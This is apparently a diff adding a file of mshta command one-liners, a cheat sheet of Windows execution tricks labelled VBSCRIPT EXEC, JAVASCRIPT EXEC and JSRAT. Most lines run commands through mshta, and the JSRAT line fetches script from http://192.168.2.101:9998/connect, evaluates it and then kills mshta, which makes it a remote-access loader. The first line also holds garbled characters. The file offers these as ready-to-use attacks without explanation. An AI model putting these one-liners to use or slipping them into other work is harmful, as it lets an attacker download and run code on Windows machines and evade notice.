@@ -1,0 +1,13 @@
+:::mshta vbscript:createobject(\"wscript.shell\").run(cmd©R¥O)
+
+::: VBSCRIPT EXEC
+:::mshta vbscript:CreateObject("Wscript.Shell").Run("calc.exe",0,true)(window.close)
+
+mshta vbscript:CreateObject("Wscript.Shell").Run("if exist e:",0,true)(window.close)
+
+
+:::JAVASCRIPT EXEC
+mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}
+
+:::JSRAT
+mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.2.101:9998/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}
